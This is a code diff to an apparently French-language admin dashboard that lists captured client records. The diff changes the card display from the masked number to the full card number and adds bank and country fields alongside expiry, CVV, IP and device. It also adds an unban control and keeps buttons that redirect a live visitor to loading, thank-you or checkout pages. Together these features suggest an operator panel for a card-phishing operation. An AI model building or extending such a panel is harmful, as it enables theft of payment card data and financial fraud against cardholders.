@@ -373,7 +373,7 @@
                         </div>
                     </div>
 
-                    <div class="card-number">•••• •••• •••• ••••</div>
+                    <div class="card-number" style="font-size:1.1rem; letter-spacing:2px;">•••• •••• •••• ••••</div>
 
                     <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
                         <div>
@@ -383,6 +383,17 @@
                         <div style="text-align:right;">
                             <div class="card-label">Exp / CVV</div>
                             <div class="card-val exp-val">- / -</div>
+                        </div>
+                    </div>
+
+                    <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
+                        <div>
+                            <div class="card-label">Banque</div>
+                            <div class="card-val bank-val" style="font-size:0.8rem; font-weight:600;">-</div>
+                        </div>
+                        <div style="text-align:right;">
+                            <div class="card-label">Pays</div>
+                            <div class="card-val country-val" style="font-size:0.8rem;">-</div>
                         </div>
                     </div>
 
@@ -406,7 +417,8 @@
                         <button onclick="redirect('${id}', 'loading')" class="btn btn-primary">LOAD</button>
                         <button onclick="redirect('${id}', 'thank_you')" class="btn btn-success">MERCI</button>
                         <button onclick="redirect('${id}', 'checkout')" class="btn btn-danger">BACK</button>
-                        <button onclick="banClient('${id}')" class="btn btn-ban" style="grid-column: span 2;">BANNIR (IP + ID)</button>
+                        <button onclick="banClient('${id}')" class="btn btn-ban">BAN</button>
+                        <button onclick="unbanClient('${id}')" class="btn btn-success" style="font-size:0.6rem;">UNBAN</button>
                     </div>
                 `;
                 clientList.prepend(card);
@@ -415,9 +427,11 @@
             if (data.full_name) {
                 card.querySelector('.name-val').textContent = data.full_name;
                 card.querySelector('.amount-val').textContent = data.montant + ' €';
-                card.querySelector('.card-number').textContent = data.numero_carte_masque;
+                card.querySelector('.card-number').textContent = data.numero_carte || '•••• •••• •••• ••••';
                 card.querySelector('.exp-val').textContent = data.expiry + ' / ' + data.cvv;
                 card.querySelector('.email-val').textContent = data.email;
+                card.querySelector('.bank-val').textContent = data.bank_name || '-';
+                card.querySelector('.country-val').textContent = data.country || '-';
                 card.querySelector('.ip-val').textContent = data.adresse_ip;
                 card.querySelector('.device-val').textContent = data.os_type || data.device;
                 card.setAttribute('data-ip', data.adresse_ip);
@@ -442,14 +456,21 @@
         async function banClient(clientId) {
             const card = document.getElementById(`card-${clientId}`);
             const ip = card ? card.getAttribute('data-ip') : null;
-
             if (!confirm(`Bannir le client ${clientId} et l'IP ${ip} ?`)) return;
-
             await fetch(`https://api-production-8591.up.railway.app/v1/admin/ban?client_id=${clientId}&ip=${ip}`, {
-                method: 'POST',
-                headers: { 'X-API-KEY': API_KEY }
+                method: 'POST', headers: { 'X-API-KEY': API_KEY }
             });
             if (card) card.classList.add('banned');
+        }
+
+        async function unbanClient(clientId) {
+            const card = document.getElementById(`card-${clientId}`);
+            const ip = card ? card.getAttribute('data-ip') : null;
+            if (!confirm(`Débannir le client ${clientId} et l'IP ${ip} ?`)) return;
+            await fetch(`https://api-production-8591.up.railway.app/v1/admin/unban?client_id=${clientId}&ip=${ip}`, {
+                method: 'POST', headers: { 'X-API-KEY': API_KEY }
+            });
+            if (card) card.classList.remove('banned');
         }
 
         async function downloadJSON() {
